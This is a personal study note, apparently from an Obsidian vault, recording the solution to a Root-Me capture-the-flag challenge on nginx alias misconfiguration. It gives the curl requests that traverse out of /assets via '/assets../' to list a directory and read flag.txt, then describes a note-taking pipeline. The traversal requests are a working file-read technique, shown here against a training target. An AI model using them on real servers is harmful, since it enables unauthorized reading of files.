---
created: 2026-08-14
up:
  - "[[Efforts]]"
related:
  - "[[Root-Me HTTP - Improper redirect]]"
  - "[[Root-Me API Broken Access (IDOR)]]"
  - "[[Nginx Alias Misconfiguration (Path Traversal)]]"
in:
  - "[[Efforts]]"
tags:
  - root-me
  - nginx
  - alias
  - path-traversal
  - web-security
  - ctf
---

# Root-Me Nginx - Alias Misconfiguration

Challenge: [Nginx - Alias Misconfiguration](https://www.root-me.org/en/Challenges/Web-Server/Nginx-Alias-Misconfiguration) — Root-Me Web/Server challenge, instance: `http://challenge01.root-me.org:59092/`, topic: nginx `alias` misconfiguration → path traversal.

> [!Milestone]+ Status: solved
> Solved with `curl` — nginx alias off-by-slash traversal: `/assets../`.

## What is known

- **Profile:** 15 pts, Web - Server, Easy, author Yo0x. Known as the "Off By Slash" alias vulnerability.
- **Instance:** `http://challenge01.root-me.org:59092/`.
- **Topic:** `location /assets/ { alias ...; }` without trailing-slash discipline lets `..` segments escape the alias root — arbitrary file read.
- **Flag:** captured at solve; value kept out of the vault (don't copy flags).

> [!NOTE]- Access: Anubis anti-bot
> Challenge pages are served behind Anubis — use a real browser session or hit the challenge instance directly.

## How it was solved

1. **Recon:** `curl -L http://challenge01.root-me.org:59092/` → page HTML contains a hint comment: `<!--TODO: Patch /assets/ -->`.
2. **Traversal:** `curl -L http://challenge01.root-me.org:59092/assets../` → nginx alias off-by-slash maps the request outside the intended directory; directory listing appears.
3. **Flag:** `curl -L http://challenge01.root-me.org:59092/assets../flag.txt` → flag.

## Post-solve pipeline

> [!COMMAND]- Learnings → vault Knowledge Pipeline (no custom tooling)
> 1. **Encounter Gate** — `skill://grill-me`: raw spark? → capture to `+/`; to promote, skip gate (`.omp/RULES.md` Steps 0–0b).
> 2. **Classify** knowledge type (Concept/Process/Entity/Principle) — `.omp/knowledge/knowledge-classification.md`.
> 3. **Distill → locate → link** — @sensemaker (atomic notes, own words) → @librarian (location) → @connector (`up:`/`related:`, duplicates, `needs-moc`). Destination `Atlas/` (`.omp/RULES.md` Steps 1–4). Logged via `bash .omp/scripts/knowledge-pipeline.sh`. Research: Open Notebook.
> 4. **Confidence** — ≥0.85 auto-run; 0.70–0.84 confirm; <0.70 options per step (`.omp/knowledge/workflows.md`). Fallbacks: @librarian fails → `+/`; @connector fails → linkless + flag.
> 5. **Frontmatter + validation** — `standards.md`, `output-standards.md`, Validation Checklist (`.omp/knowledge/workflows.md`).
> 6. **MOC Gate** — `skill://grill-me` + `skill://moc-workbench`; `scripts/validate_moc.py` (`.omp/RULES.md` Step 5; squeeze-point rule).

Never ingest challenge tokens/keys into notes — `.omp/RULES.md` Sensitive Data Protection (FATAL).
